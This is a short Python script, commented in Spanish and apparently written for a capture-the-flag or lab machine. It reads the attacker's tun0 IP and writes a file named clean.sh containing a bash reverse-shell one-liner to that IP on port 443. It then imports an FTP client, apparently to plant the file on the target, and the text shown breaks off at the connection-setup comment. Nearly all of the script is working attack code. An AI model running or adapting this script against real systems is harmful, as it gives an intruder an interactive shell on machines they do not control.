# reverse shell
import time
from ftplib import FTP
import os
import netifaces # para recoger ip

ip_victim = input("Introduzca su IP: ")

def get_ip():
  interfaces = netifaces.interfaces()
  tun0 = netifaces.ifaddresses(interfaces[3])
  direction_ip = tun0[2][0]['addr']
  print(f'La IP de tu interfáz tun0 es {direction_ip}')
  return direction_ip

get_ip()

tun0 = get_ip()
time.sleep(2)

with open("clean.sh", "a") as file:
  file.write("#!/bin/bash\n\nbash -i >& /dev/tcp/" + tun0 + "/443 0>&1\n")

#comprobar si el fichero se crea correctamente:
if os.path.isfile("clean.sh"):
  print("Se ha creado correctamente el archivo clean.sh")
else:
  print("Hubo un error al crear el archivo clean.sh")
  exit(1)

# configurar los parámetros de conexión y archivos:
